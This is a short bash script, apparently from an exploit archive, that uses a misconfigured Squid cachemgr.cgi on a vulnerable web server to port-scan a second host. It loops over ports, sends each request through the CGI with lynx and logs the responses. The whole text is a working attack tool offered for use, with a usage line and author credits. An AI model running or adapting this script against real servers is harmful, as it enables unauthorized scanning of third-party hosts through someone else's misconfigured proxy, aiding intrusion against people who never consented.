#!/bin/bash -x

# Port scanning using a misconfigured squid
# using open apache

# Usage miscachemgr host_vuln host_to_scan end_port

# Concept: Jacobo Van Leeuwen & Francisco Sáa Muñoz
# Coded by Francisco Sáa Muñoz
# IP6 [Logic Control]

PORT=1
ONE='/cgi-bin/cachemgr.cgi?host='
TWO='&port='
THREE='&user_name=&operation&auth='

mkdir from_$1_to_$2

while [ $PORT -lt $3 ]; do

# lynx -dump http://$1/cgi-bin/cachemgr.cgi?host=\
# $2&port=$PORT&user_name=&operation=authenticate&auth= > \
# port_$1_to_$2/$PORT.log 2>&1

lynx -dump http://$1$ONE$2$TWO$PORT$THREE > from_$1_to_$2/$PORT.log 2>&1
let PORT=PORT+1

done
